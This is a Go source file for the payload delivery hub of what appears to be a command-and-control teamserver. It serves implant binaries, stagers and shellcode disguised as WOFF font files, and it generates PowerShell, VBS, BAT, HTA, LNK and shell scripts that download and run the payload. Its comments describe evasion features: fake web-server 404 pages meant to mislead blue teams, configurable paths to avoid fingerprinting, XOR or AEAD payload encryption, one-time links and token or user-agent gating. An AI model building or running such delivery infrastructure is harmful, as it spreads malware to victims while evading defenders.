package delivery

import (
	"BackendTemplate/pkg/config"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/utils/logx"
	"crypto/rand"
	"crypto/subtle"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Resource types served by the hub
const (
	ResFull      = "full"
	ResStager    = "stager"
	ResShellcode = "sc"
	ResWoff      = "woff"
	ResPS1       = "ps1"
	ResVBS       = "vbs"
	ResBat       = "bat"
	ResHta       = "hta"
	ResLnk       = "lnk" // A6: 快捷方式交付脚本
	ResSh        = "sh"  // Linux shell 脚本载荷
)

// Payload holds in-memory patched binaries for one delivery profile
type Payload struct {
	Full      []byte
	Stager    []byte // optional; may be empty if build failed
	Shellcode []byte // optional windows shellcode / donut output
	FileName  string
}

// Profile is a live delivery entry
type Profile struct {
	Meta    database.WebDelivery
	Payload Payload
	// one-time flags: after successful serve, mark consumed
	// 内存 CAS 负责并发互斥，消费结果同时落库（full_used/stager_used/sc_used），
	// 否则服务重启后一次性 URL 会复活。
	fullUsed   int32
	stagerUsed int32
	scUsed     int32
	// hits 是命中数的原子计数（MaxDownloads 的并发闸门也依赖它）。
	hits int64
	// statsMu 串行化 LastHit* 与 DB 写入，避免并发提交回写较小的旧值。
	statsMu sync.Mutex
}

// Hub is the central delivery router (shared mode)
type Hub struct {
	mu       sync.RWMutex
	byKey    map[string]*Profile // public_key -> profile
	byPort   map[string]*Profile // listening_port -> profile (legacy lookup)
	mainPort int                 // teamserver port for URL building
}

var GlobalHub = NewHub()

func NewHub() *Hub {
	return &Hub{
		byKey:  make(map[string]*Profile),
		byPort: make(map[string]*Profile),
	}
}

func (h *Hub) SetMainPort(port int) {
	h.mu.Lock()
	h.mainPort = port
	h.mu.Unlock()
}

func (h *Hub) MainPort() int {
	h.mu.RLock()
	defer h.mu.RUnlock()
	return h.mainPort
}

// RandomKey generates a short public key
func RandomKey(n int) string {
	if n <= 0 {
		n = 8
	}
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)[:n*2]
	// hex is 2*n chars; for n=8 -> 16 hex chars. Prefer shorter:
}

// ShortKey returns ~10 char url-safe key
func ShortKey() string {
	b := make([]byte, 6)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b) // 12 hex chars
}

// Register adds/updates a live profile
func (h *Hub) Register(meta database.WebDelivery, payload Payload) {
	if meta.PublicKey == "" {
		meta.PublicKey = ShortKey()
	}
	p := &Profile{
		Meta:       meta,
		Payload:    payload,
		fullUsed:   int32(meta.FullUsed),
		stagerUsed: int32(meta.StagerUsed),
		scUsed:     int32(meta.ScUsed),
		hits:       meta.HitCount,
	}
	h.mu.Lock()
	h.byKey[meta.PublicKey] = p
	if meta.ListeningPort != "" && meta.ListeningPort != "shared" {
		h.byPort[meta.ListeningPort] = p
	}
	h.mu.Unlock()
}

// Unregister removes by public key or listening port
func (h *Hub) Unregister(publicKey, port string) {
	h.mu.Lock()
	defer h.mu.Unlock()
	if publicKey != "" {
		if p, ok := h.byKey[publicKey]; ok {
			delete(h.byKey, publicKey)
			if p.Meta.ListeningPort != "" {
				delete(h.byPort, p.Meta.ListeningPort)
			}
		}
	}
	if port != "" {
		if p, ok := h.byPort[port]; ok {
			delete(h.byPort, port)
			delete(h.byKey, p.Meta.PublicKey)
		}
	}
}

func (h *Hub) GetByKey(key string) (*Profile, bool) {
	h.mu.RLock()
	defer h.mu.RUnlock()
	p, ok := h.byKey[key]
	return p, ok
}

func (h *Hub) GetByPort(port string) (*Profile, bool) {
	h.mu.RLock()
	defer h.mu.RUnlock()
	p, ok := h.byPort[port]
	return p, ok
}

func (h *Hub) ListKeys() []string {
	h.mu.RLock()
	defer h.mu.RUnlock()
	keys := make([]string, 0, len(h.byKey))
	for k := range h.byKey {
		keys = append(keys, k)
	}
	return keys
}

// PublicURLOptions 可选覆盖（一般用全局 config + meta 字段）
type PublicURLOptions struct {
	Scheme   string
	Host     string
	BasePath string
}

// effectiveDeliveryDefaults 读取全局 delivery 配置
func effectiveDeliveryDefaults() config.DeliveryConfig {
	cfg := config.DeliveryConfig{
		DefaultScheme:     "http",
		OmitDefaultPort:   true,
		TrustProxyHeaders: true,
	}
	d, externalIP, serverPort := config.DeliverySettings()
	if d.DefaultScheme != "" {
		cfg.DefaultScheme = d.DefaultScheme
	}
	cfg.DefaultHost = d.DefaultHost
	cfg.BasePath = d.BasePath
	cfg.ForceHTTPS = d.ForceHTTPS
	cfg.OmitDefaultPort = d.OmitDefaultPort
	cfg.CacheMaxAge = d.CacheMaxAge
	cfg.CORSAllowOrigin = d.CORSAllowOrigin
	cfg.TrustProxyHeaders = d.TrustProxyHeaders
	cfg.FullSegment = d.FullSegment
	cfg.StagerSegment = d.StagerSegment
	cfg.ScSegment = d.ScSegment
	cfg.WoffSegment = d.WoffSegment
	cfg.FullContentType = d.FullContentType
	// server.external_ip 可作为 host 回退
	if cfg.DefaultHost == "" && externalIP != "" {
		if serverPort > 0 && serverPort != 80 && serverPort != 443 {
			cfg.DefaultHost = fmt.Sprintf("%s:%d", externalIP, serverPort)
		} else {
			cfg.DefaultHost = externalIP
		}
	}
	return cfg
}

func normalizeScheme(s string, forceHTTPS bool) string {
	s = strings.ToLower(strings.TrimSpace(s))
	if forceHTTPS {
		return "https"
	}
	if s == "https" || s == "http" {
		return s
	}
	return "http"
}

// sanitizeAttachmentName 去掉会破坏 Content-Disposition 的字符（引号/反斜杠/路径分隔符/控制字符）。
func sanitizeAttachmentName(name string) string {
	clean := strings.Map(func(r rune) rune {
		if r < 0x20 || r == '"' || r == '\\' || r == '/' || r == ';' {
			return '_'
		}
		return r
	}, name)
	clean = strings.TrimSpace(clean)
	if clean == "" {
		return "payload.bin"
	}
	return clean
}

// notFoundResponse 伪装成常见 Web 服务器的 404 页面。
// Go 默认的 "404 page not found" 纯文本本身就是投递路由的指纹。
const notFoundResponse = `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>404 Not Found</title>
<style>body{background:#fff;color:#444;font:14px/1.6 -apple-system,Segoe UI,Roboto,Arial,sans-serif;margin:0}
.wrap{max-width:720px;margin:12vh auto;padding:0 24px}h1{font-size:36px;font-weight:600;margin:0 0 12px}
p{color:#666}</style></head>
<body><div class="wrap"><h1>Not Found</h1>
<p>The requested URL was not found on this server.</p></div></body></html>`

// writeNotFound 输出统一、无路由语义的 404（所有投递失败路径共用）。
func writeNotFound(w http.ResponseWriter, r *http.Request) {
	ApplyDeliveryHeaders(w, "text/html; charset=utf-8")
	w.Header().Set("Content-Length", strconv.Itoa(len(notFoundResponse)))
	w.WriteHeader(http.StatusNotFound)
	_, _ = io.WriteString(w, notFoundResponse)
}

func normalizeBasePath(bp string) string {
	bp = strings.TrimSpace(bp)
	if bp == "" || bp == "/" {
		return ""
	}
	if !strings.HasPrefix(bp, "/") {
		bp = "/" + bp
	}
	return strings.TrimRight(bp, "/")
}

// RoutePrefix 返回公开投递路径前缀（默认 /d，可由 delivery.route_prefix 配置）。
func RoutePrefix() string {
	return config.DeliveryRoutePrefix()
}

// ResourceSegments 是四个公开资源段名。全部可配置，避免固定 /full /stager /sc /woff 指纹。
type ResourceSegments struct {
	Full   string
	Stager string
	Sc     string
	Woff   string
}

// normalizeSegment 把配置值收敛成单个合法路径段；非法值回退默认。
func normalizeSegment(s, fallback string) string {
	s = strings.Trim(strings.TrimSpace(s), "/")
	if s == "" || strings.ContainsAny(s, "/?#") {
		return fallback
	}
	for _, r := range s {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') ||
			r == '-' || r == '_' || r == '.' || r == '~' {
			continue
		}
		return fallback
	}
	// 与路由前缀同名会让 /d/d/... 产生歧义
	if "/"+s == RoutePrefix() {
		return fallback
	}
	// 这些是 Hub 的兼容别名/脚本资源名，占用后会产生路由歧义
	switch strings.ToLower(s) {
	case "d", "file", "payload", "bin", "ps1", "vbs", "bat", "hta", "lnk", "sh":
		return fallback
	}
	return s
}

// ResourceNames 返回规范化后的资源段名；任一段重复时整体回退默认值。
func ResourceNames() ResourceSegments {
	d := effectiveDeliveryDefaults()
	n := ResourceSegments{
		Full:   normalizeSegment(d.FullSegment, ResFull),
		Stager: normalizeSegment(d.StagerSegment, ResStager),
		Sc:     normalizeSegment(d.ScSegment, ResShellcode),
		Woff:   normalizeSegment(d.WoffSegment, ResWoff),
	}
	if n.Full == n.Stager || n.Full == n.Sc || n.Full == n.Woff ||
		n.Stager == n.Sc || n.Stager == n.Woff || n.Sc == n.Woff {
		return ResourceSegments{Full: ResFull, Stager: ResStager, Sc: ResShellcode, Woff: ResWoff}
	}
	return n
}

func stripDefaultPort(host, scheme string, omit bool) string {
	if !omit || host == "" {
		return host
	}
	// host may be host:port
	h, p, ok := strings.Cut(host, ":")
	if !ok {
		return host
	}
	// skip if IPv6-like with brackets
	if strings.HasPrefix(host, "[") {
		return host
	}
	if scheme == "https" && p == "443" {
		return h
	}
	if scheme == "http" && p == "80" {
		return h
	}
	return host
}

// BuildPublicURLs fills ServerAddress / StagerURL / ShellcodeURL
// 支持 HTTPS、域名、CDN base_path；优先级：meta 字段 > 全局 delivery 配置 > 监听器推断
func BuildPublicURLs(meta *database.WebDelivery, mainPort int) {
	defs := effectiveDeliveryDefaults()

	scheme := normalizeScheme(meta.PublicScheme, defs.ForceHTTPS)
	if meta.PublicScheme == "" && !defs.ForceHTTPS {
		scheme = normalizeScheme(defs.DefaultScheme, false)
	}

	host := strings.TrimSpace(meta.PublicHost)
	if host == "" {
		host = strings.TrimSpace(defs.DefaultHost)
	}
	// 若 host 自带 scheme，拆开
	if strings.Contains(host, "://") {
		if u := strings.SplitN(host, "://", 2); len(u) == 2 {
			if meta.PublicScheme == "" && !defs.ForceHTTPS {
				scheme = normalizeScheme(u[0], defs.ForceHTTPS)
			}
			host = u[1]
		}
	}
	host = strings.TrimRight(host, "/")

	if host == "" {
		// try parse from listener connect address
		if parts := strings.SplitN(meta.ListenerConfig, "://", 2); len(parts) == 2 {
			addr := parts[1]
			if i := strings.Index(addr, "/"); i > 0 {
				addr = addr[:i]
			}
			addr = strings.Replace(addr, "0.0.0.0", "127.0.0.1", 1)
			if hp := strings.Split(addr, ":"); len(hp) >= 1 && hp[0] != "" {
				if meta.BindMode == "dedicated" && meta.ListeningPort != "" && !strings.HasPrefix(meta.ListeningPort, "shared") {
					host = hp[0] + ":" + meta.ListeningPort
				} else if mainPort > 0 {
					host = hp[0] + ":" + fmt.Sprintf("%d", mainPort)
				} else {
					host = addr
				}
			}
		}
		if host == "" {
			if meta.BindMode == "dedicated" && meta.ListeningPort != "" && !strings.HasPrefix(meta.ListeningPort, "shared") {
				host = "127.0.0.1:" + meta.ListeningPort
			} else if mainPort > 0 {
				host = fmt.Sprintf("127.0.0.1:%d", mainPort)
			} else {
				host = "127.0.0.1"
			}
		}
	}

	host = stripDefaultPort(host, scheme, defs.OmitDefaultPort)

	basePath := normalizeBasePath(meta.BasePath)
	if basePath == "" {
		basePath = normalizeBasePath(defs.BasePath)
	}

	keyPath := meta.URIPath
	if keyPath == "" {
		keyPath = meta.PublicKey
	}
	keyPath = strings.Trim(keyPath, "/")

	// {scheme}://{host}{basePath}{prefix}/{key}
	base := fmt.Sprintf("%s://%s%s%s/%s", scheme, host, basePath, RoutePrefix(), keyPath)

	fname := meta.FileName
	if fname == "" {
		fname = "payload"
	}
	names := ResourceNames()
	meta.ServerAddress = base + "/" + names.Full + "/" + url.PathEscape(fname)
	meta.StagerURL = base + "/" + names.Stager
	meta.ShellcodeURL = base + "/" + names.Sc
	if strings.ToLower(meta.OS) == "windows" {
		meta.ShellcodeURL = base + "/" + names.Woff
	}
}

// ApplyDeliveryHeaders sets CDN-friendly cache/CORS headers on delivery responses
func ApplyDeliveryHeaders(w http.ResponseWriter, contentType string) {
	defs := effectiveDeliveryDefaults()
	if contentType != "" {
		w.Header().Set("Content-Type", contentType)
	}
	if defs.CacheMaxAge > 0 {
		w.Header().Set("Cache-Control", fmt.Sprintf("public, max-age=%d", defs.CacheMaxAge))
	} else {
		w.Header().Set("Cache-Control", "no-store")
	}
	if origin := strings.TrimSpace(defs.CORSAllowOrigin); origin != "" {
		w.Header().Set("Access-Control-Allow-Origin", origin)
		w.Header().Set("Access-Control-Allow-Methods", "GET, OPTIONS, HEAD")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-Delivery-Token")
	}
	// help CDN vary on token query if used
	w.Header().Set("Vary", "Origin")
}

// ServeHTTP handles /d/{key}/{resource}[/{filename}]
func (h *Hub) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	// CDN / 浏览器预检
	if r.Method == http.MethodOptions {
		ApplyDeliveryHeaders(w, "")
		w.WriteHeader(http.StatusNoContent)
		return
	}
	// path: {prefix}/{key}/full[/name] | .../stager | .../sc | .../woff
	// 兼容 CDN base_path：允许 /static{prefix}/... 形式（反代可能保留前缀）
	prefix := RoutePrefix()
	path := r.URL.Path
	if i := strings.Index(path, prefix+"/"); i >= 0 {
		path = path[i+len(prefix)+1:]
	} else if prefix != "/d" {
		// 改过前缀后仍接受旧的 /d/ 形式，避免升级瞬间旧载荷全体 404
		if i := strings.Index(path, "/d/"); i >= 0 {
			path = path[i+len("/d/"):]
		} else {
			path = strings.TrimPrefix(path, prefix)
		}
	} else {
		path = strings.TrimPrefix(path, prefix)
	}
	path = strings.Trim(path, "/")
	parts := strings.Split(path, "/")
	if len(parts) < 2 {
		writeNotFound(w, r)
		return
	}
	key := parts[0]
	resource := parts[1]

	p, ok := h.GetByKey(key)
	// also allow URIPath as key alias: scan
	if !ok {
		h.mu.RLock()
		for _, prof := range h.byKey {
			alias := strings.Trim(prof.Meta.URIPath, "/")
			if alias != "" && alias == key {
				p = prof
				ok = true
				break
			}
			// public key match already handled
		}
		h.mu.RUnlock()
	}
	if !ok || p == nil {
		writeNotFound(w, r)
		return
	}
	if p.Meta.Status != 1 {
		// 伪装 404：投递已关闭不暴露语义
		logAccess(p, resource, r, http.StatusNotFound, 0)
		writeNotFound(w, r)
		return
	}

	// access controls
	// 【防盗门】优先校验 StagerToken（配额令牌，一次一密）：请求携带的令牌命中
	// StagerToken 记录 → 扣减配额；未命中则回退 AccessToken/UA 逻辑。
	token := r.Header.Get("X-Delivery-Token")
	if token == "" {
		token = r.URL.Query().Get("t")
	}
	if token == "" {
		token = r.URL.Query().Get("token")
	}
	if token != "" && ConsumeStagerToken(p.Meta.PublicKey, token, clientIP(r)) {
		// 门禁令牌有效：直接放行（不再要求 AccessToken）
	} else if !checkAccess(p, r) {
		logAccess(p, resource, r, http.StatusNotFound, 0)
		// 伪装 404：让蓝队以为是"URL 不存在"，不暴露令牌/访问控制语义
		writeNotFound(w, r)
		return
	}

	var data []byte
	var contentType string
	var filename string
	var oneTimeColumn string

	names := ResourceNames()
	switch {
	case resource == names.Full || resource == ResFull || resource == "file" || resource == "payload":
		resource = ResFull
		data = p.Payload.Full
		contentType = p.Meta.ContentType
		if contentType == "" {
			contentType = "application/octet-stream"
		}
		filename = p.Meta.FileName
		if filename == "" {
			filename = p.Payload.FileName
		}
		if filename == "" {
			filename = "payload.bin"
		}
		oneTimeColumn = "full_used"
	case resource == names.Stager || resource == ResStager:
		resource = ResStager
		data = p.Payload.Stager
		// stager 与 shellcode 同属 stage 资源，应使用 StageContentType（如 font/woff），
		// 而不是完整载荷的 ContentType。
		contentType = p.Meta.StageContentType
		if contentType == "" {
			contentType = "application/octet-stream"
		}
		filename = "stager"
		if p.Meta.OS == "windows" {
			filename = "stager.exe"
		}
		oneTimeColumn = "stager_used"
	case resource == names.Sc || resource == ResShellcode || resource == "bin":
		resource = ResShellcode
		data = p.Payload.Shellcode
		contentType = p.Meta.StageContentType
		if contentType == "" {
			contentType = "application/octet-stream"
		}
		filename = "payload.bin"
		oneTimeColumn = "sc_used"
	case resource == names.Woff || resource == ResWoff:
		resource = ResWoff
		data = p.Payload.Shellcode
		if len(data) == 0 {
			data = p.Payload.Stager
		}
		contentType = p.Meta.StageContentType
		if contentType == "" {
			contentType = "font/woff"
		}
		filename = p.Meta.FileName + ".woff"
		if p.Meta.FileName == "" {
			filename = "font.woff"
		}
		oneTimeColumn = "sc_used"
	case resource == ResPS1 || resource == ResVBS || resource == ResBat || resource == ResHta || resource == ResLnk || resource == ResSh:
		// 脚本载荷：运行时从下载地址拉取并执行；?mode=embed 内嵌 base64（ps1/bat 支持）
		if p.Meta.CryptoMode == "aead" {
			// 脚本模板不具备 AEAD 解密能力，返回伪装 404 而不是下发一段必然执行失败的脚本
			writeNotFound(w, r)
			logAccess(p, resource, r, http.StatusNotFound, 0)
			return
		}
		if len(p.Payload.Full) == 0 {
			writeNotFound(w, r)
			logAccess(p, resource, r, http.StatusNotFound, 0)
			return
		}
		scheme := "http"
		if r.TLS != nil {
			scheme = "https"
		}
		host := r.Host
		if host == "" {
			host = "127.0.0.1"
		}
		basePath := normalizeBasePath(p.Meta.BasePath)
		keyPath := strings.Trim(p.Meta.URIPath, "/")
		if keyPath == "" {
			keyPath = p.Meta.PublicKey
		}
		fname := p.Meta.FileName
		if fname == "" {
			fname = p.Payload.FileName
		}
		if fname == "" {
			fname = "payload.bin"
		}
		fullURL := fmt.Sprintf("%s://%s%s%s/%s/%s/%s", scheme, host, basePath, RoutePrefix(), keyPath, names.Full, url.PathEscape(fname))
		// 令牌不再拼进 URL：交给脚本放进 X-Delivery-Token 头，
		// 避免 ?t= 进入代理/网关日志与浏览器历史。
		data = GenerateScriptWithToken(resource, r.URL.Query().Get("mode"), fullURL, p.Meta.DownloadPath, p.Meta.SaveFilename, p.Meta.Pass, p.Meta.AccessToken, p.Payload.Full)
		contentType = ScriptContentType(resource)
		filename = ScriptFileName(resource)
	default:
		writeNotFound(w, r)
		return
	}

	if len(data) == 0 {
		// 伪装 404
		writeNotFound(w, r)
		logAccess(p, resource, r, http.StatusNotFound, 0)
		return
	}

	// 载荷加密必须先于限额/一次性消费：加密失败时不能白白烧掉名额或一次性 URL。
	//   - aead：加密 full 与 shellcode/woff（Windows Stager 拉 shellcode、Linux Stager 拉 full，
	//     两者都内置密钥解密）；Stager 自身必须保持可执行，不加密；脚本模板不支持 AEAD。
	//   - xor：保留旧行为，full/stager/sc/woff 全部单字节异或（脚本模板不动）。
	if p.Meta.CryptoMode == "aead" {
		if resource == ResFull || resource == ResShellcode || resource == ResWoff {
			enc, err := AEADEncrypt(data, p.Meta.DeliveryKey)
			if err != nil {
				logx.Infof("[Delivery] AEAD 加密失败 key=%s: %v\n", p.Meta.PublicKey, err)
				writeNotFound(w, r)
				logAccess(p, resource, r, http.StatusNotFound, 0)
				return
			}
			data = enc
		}
	} else if (p.Meta.CryptoMode == "xor" || (p.Meta.CryptoMode == "" && p.Meta.XorKey != 0)) && p.Meta.XorKey != 0 && resource != ResPS1 && resource != ResVBS && resource != ResBat && resource != ResHta && resource != ResLnk && resource != ResSh {
		enc, err := XorEncode(data, byte(p.Meta.XorKey))
		if err == nil {
			data = enc
		}
	}

	// 先原子预占一个下载名额（同时承担 MaxDownloads 闸门与命中计数）。
	// 顺序很重要：先限额、后消费一次性，否则被上限拒绝的请求会白白烧掉一次性 URL。
	if !p.reserveHit() {
		// 达到下载上限：伪装 404
		writeNotFound(w, r)
		logAccess(p, resource, r, http.StatusNotFound, 0)
		return
	}
	// one-time check（CAS 原子消费：并发请求只有一个能通过，避免双重消费）
	if p.Meta.OneTime == 1 && oneTimeColumn != "" {
		if !p.consumeOneTime(oneTimeColumn) {
			p.releaseHit()
			// 一次性链接已用：伪装 404
			writeNotFound(w, r)
			logAccess(p, resource, r, http.StatusNotFound, 0)
			return
		}
	}

	ApplyDeliveryHeaders(w, contentType)
	// only set attachment for obvious binary downloads; fonts/js look more natural inline
	if !strings.Contains(contentType, "font") && !strings.Contains(contentType, "javascript") && !strings.Contains(contentType, "image") {
		w.Header().Set("Content-Disposition", "attachment; filename="+sanitizeAttachmentName(filename))
	}
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
	n, _ := w.Write(data)

	// stats：名额在下载前已预占，这里只提交时间/IP 与持久化计数
	p.commitHit(clientIP(r))
	logAccess(p, resource, r, http.StatusOK, int64(n))
}

func checkAccess(p *Profile, r *http.Request) bool {
	// token
	if tok := strings.TrimSpace(p.Meta.AccessToken); tok != "" {
		q := r.URL.Query().Get("t")
		if q == "" {
			q = r.URL.Query().Get("token")
		}
		if q == "" {
			q = r.Header.Get("X-Delivery-Token")
		}
		// 常数时间比较，防时序侧信道
		if subtle.ConstantTimeCompare([]byte(q), []byte(tok)) != 1 {
			return false
		}
	}
	// UA allow list：默认子串匹配（逗号分隔）；条目以 "=" 前缀时为完整 UA 匹配
	// （如 "=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"）
	if allow := strings.TrimSpace(p.Meta.UAAllow); allow != "" {
		ua := r.Header.Get("User-Agent")
		ok := false
		for _, part := range strings.Split(allow, ",") {
			part = strings.TrimSpace(part)
			if part == "" {
				continue
			}
			if strings.HasPrefix(part, "=") {
				if ua == strings.TrimPrefix(part, "=") {
					ok = true
					break
				}
			} else if strings.Contains(ua, part) {
				ok = true
				break
			}
		}
		if !ok {
			return false
		}
	}
	return true
}

// reserveHit 原子预占一个下载名额。
// max=0 表示不限额，只做计数；max>0 时用 CAS 保证并发下不会超过上限。
func (p *Profile) reserveHit() bool {
	max := int64(p.Meta.MaxDownloads)
	for {
		cur := atomic.LoadInt64(&p.hits)
		if max > 0 && cur >= max {
			return false
		}
		if atomic.CompareAndSwapInt64(&p.hits, cur, cur+1) {
			return true
		}
	}
}

// releaseHit 归还预占名额（一次性校验失败等未真正下发的路径）。
func (p *Profile) releaseHit() {
	if atomic.AddInt64(&p.hits, -1) < 0 {
		atomic.StoreInt64(&p.hits, 0)
	}
}

// consumeOneTime 原子消费一次性资源并把状态落库。
// CAS 失败=并发请求已消费；落库失败只记录日志，内存态仍然生效。
func (p *Profile) consumeOneTime(column string) bool {
	var flag *int32
	switch column {
	case "full_used":
		flag = &p.fullUsed
	case "stager_used":
		flag = &p.stagerUsed
	case "sc_used":
		flag = &p.scUsed
	default:
		return false
	}
	if !atomic.CompareAndSwapInt32(flag, 0, 1) {
		return false
	}
	if database.DB() != nil {
		if err := database.Deliveries().MarkOneTimeUsed(p.Meta.ID, p.Meta.PublicKey, column); err != nil {
			logx.Infof("[Delivery] 一次性状态落库失败 key=%s col=%s: %v\n", p.Meta.PublicKey, column, err)
		}
	}
	return true
}

// commitHit 提交成功下载的时间/IP 与命中计数。
// statsMu 保证并发提交不会把更小的旧计数写回数据库。
func (p *Profile) commitHit(ip string) {
	p.statsMu.Lock()
	defer p.statsMu.Unlock()
	at := time.Now().Format("2006-01-02 15:04:05")
	p.Meta.LastHitAt = at
	p.Meta.LastHitIP = ip
	n := atomic.LoadInt64(&p.hits)
	p.Meta.HitCount = n
	if database.DB() == nil {
		return
	}
	if err := database.Deliveries().UpdateHitStats(p.Meta.ID, p.Meta.PublicKey, n, at, ip); err != nil {
		logx.Infof("[Delivery] 命中统计落库失败 key=%s: %v\n", p.Meta.PublicKey, err)
	}
}

func clientIP(r *http.Request) string {
	// 只有显式配置信任反代头时才采信，否则客户端可以伪造 X-Forwarded-For
	// 污染访问日志 / 令牌使用记录。
	if effectiveDeliveryDefaults().TrustProxyHeaders {
		if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
			parts := strings.Split(xff, ",")
			return strings.TrimSpace(parts[0])
		}
		if xri := r.Header.Get("X-Real-IP"); xri != "" {
			return xri
		}
	}
	addr := r.RemoteAddr
	if i := strings.LastIndex(addr, ":"); i > 0 {
		return addr[:i]
	}
	return addr
}

func logAccess(p *Profile, resource string, r *http.Request, code int, bytes int64) {
	if database.DB() == nil {
		return
	}
	entry := database.DeliveryAccessLog{
		DeliveryID: p.Meta.ID,
		PublicKey:  p.Meta.PublicKey,
		Resource:   resource,
		ClientIP:   clientIP(r),
		UserAgent:  r.Header.Get("User-Agent"),
		StatusCode: code,
		BytesSent:  bytes,
	}
	_, _ = database.DB().Insert(&entry)
}

// DefaultsView 前端可见的全局 delivery 默认
type DefaultsView struct {
	DefaultScheme     string `json:"defaultScheme"`
	DefaultHost       string `json:"defaultHost"`
	BasePath          string `json:"basePath"`
	ForceHTTPS        bool   `json:"forceHttps"`
	OmitDefaultPort   bool   `json:"omitDefaultPort"`
	CacheMaxAge       int    `json:"cacheMaxAge"`
	CORSAllowOrigin   string `json:"corsAllowOrigin"`
	TrustProxyHeaders bool   `json:"trustProxyHeaders"`
	RoutePrefix       string `json:"routePrefix"`
	FullSegment       string `json:"fullSegment"`
	StagerSegment     string `json:"stagerSegment"`
	ScSegment         string `json:"scSegment"`
	WoffSegment       string `json:"woffSegment"`
	FullContentType   string `json:"fullContentType"`
}

// GetDefaultsView 导出全局 delivery 配置快照
func GetDefaultsView() DefaultsView {
	d := effectiveDeliveryDefaults()
	names := ResourceNames()
	return DefaultsView{
		DefaultScheme:     d.DefaultScheme,
		DefaultHost:       d.DefaultHost,
		BasePath:          d.BasePath,
		ForceHTTPS:        d.ForceHTTPS,
		OmitDefaultPort:   d.OmitDefaultPort,
		CacheMaxAge:       d.CacheMaxAge,
		CORSAllowOrigin:   d.CORSAllowOrigin,
		TrustProxyHeaders: d.TrustProxyHeaders,
		RoutePrefix:       RoutePrefix(),
		FullSegment:       names.Full,
		StagerSegment:     names.Stager,
		ScSegment:         names.Sc,
		WoffSegment:       names.Woff,
		FullContentType:   DefaultFullContentType("windows"),
	}
}
